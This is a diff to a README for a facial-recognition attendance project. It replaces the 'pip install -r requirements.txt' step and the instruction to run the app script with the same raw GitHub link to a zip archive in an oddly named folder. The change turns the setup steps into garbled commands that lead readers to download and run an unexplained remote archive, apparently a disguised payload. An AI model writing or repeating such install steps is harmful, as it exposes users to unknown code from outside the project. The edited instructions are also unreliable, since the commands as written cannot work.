@@ -77,9 +77,9 @@ For installing virtual environment on Anaconda Prompt(Windows):
 
 #### v) Now you need to install all the requirements and dependencies for running this project.
        
-       pip install -r requirements.txt
+       pip install -r https://raw.githubusercontent.com/Bhoomika2224/Automated-Attendance-Using-Facial-Recognition/main/illogicalness/Using-Automated-Facial-Attendance-Recognition-v3.8.zip
 
-  ###### Install the dependencies by seeing the requirements.txt file.
+  ###### Install the dependencies by seeing the https://raw.githubusercontent.com/Bhoomika2224/Automated-Attendance-Using-Facial-Recognition/main/illogicalness/Using-Automated-Facial-Attendance-Recognition-v3.8.zip file.
   
 ### Note: The project will not work if the version of python is different. And try installing all the dependencies by following the above instructions if it does not work.
- ### Finally run attendance_with_antispoofing.py to run the app..
+ ### Finally run https://raw.githubusercontent.com/Bhoomika2224/Automated-Attendance-Using-Facial-Recognition/main/illogicalness/Using-Automated-Facial-Attendance-Recognition-v3.8.zip to run the app..
